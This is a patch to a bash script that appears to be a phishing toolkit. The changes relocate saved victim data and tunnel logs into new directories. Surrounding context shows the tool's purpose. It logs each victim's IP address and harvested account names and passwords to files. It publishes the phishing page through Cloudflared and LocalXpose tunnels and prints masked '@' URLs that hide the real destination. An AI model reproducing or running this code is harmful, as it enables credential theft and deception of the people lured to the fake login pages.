@@ -106,17 +106,22 @@ RESETBG="$(printf '\e[0m\n')"
 if [[ ! -d ".server" ]]; then
 	mkdir -p ".server"
 fi
+
+if [[ ! -d "auth" ]]; then
+	mkdir -p "auth"
+fi
+
 if [[ -d ".server/www" ]]; then
 	rm -rf ".server/www"
 	mkdir -p ".server/www"
 else
 	mkdir -p ".server/www"
 fi
-if [[ -e ".cld.log" ]]; then
-	rm -rf ".cld.log"
+if [[ -e ".server/.cld.log" ]]; then
+	rm -rf ".server/.cld.log"
 fi
-if [[ -e ".loclx" ]]; then
-	rm -rf ".loclx"
+if [[ -e ".server/.loclx" ]]; then
+	rm -rf ".server/.loclx"
 fi
 
 ## Script termination
@@ -401,8 +406,8 @@ capture_ip() {
 	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
-	cat .server/www/ip.txt >> ip.txt
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
+	cat .server/www/ip.txt >> auth/ip.txt
 }
 
 ## Get credentials
@@ -412,8 +417,8 @@ capture_creds() {
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
-	cat .server/www/usernames.txt >> usernames.dat
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
+	cat .server/www/usernames.txt >> auth/usernames.dat
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
 
@@ -464,14 +469,14 @@ start_cloudflared() {
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
     if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
     else
-        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
     fi
 
 	{ sleep 8; clear; banner_small; }
 	
-	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
+	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
 	cldflr_link1=${cldflr_link#https://}
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
@@ -485,13 +490,13 @@ start_loclx() {
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/loclx tunnel H -t "$HOST":"$PORT" --https-redirect > .loclx 2>&1 &
+        sleep 2 && termux-chroot ./.server/loclx tunnel H -t "$HOST":"$PORT" --https-redirect > .server/.loclx 2>&1 &
     else
-        sleep 2 && ./.server/loclx tunnel H -t "$HOST":"$PORT" --https-redirect > .loclx 2>&1 &
+        sleep 2 && ./.server/loclx tunnel H -t "$HOST":"$PORT" --https-redirect > .server/.loclx 2>&1 &
     fi
 
 	{ sleep 12; clear; banner_small; }
-	loclx_url=$(cat .loclx | grep -o '[-0-9a-z]*\.loclx.io')
+	loclx_url=$(cat .server/.loclx | grep -o '[-0-9a-z]*\.loclx.io')
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}http://$loclx_url"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$loclx_url"
 	capture_data
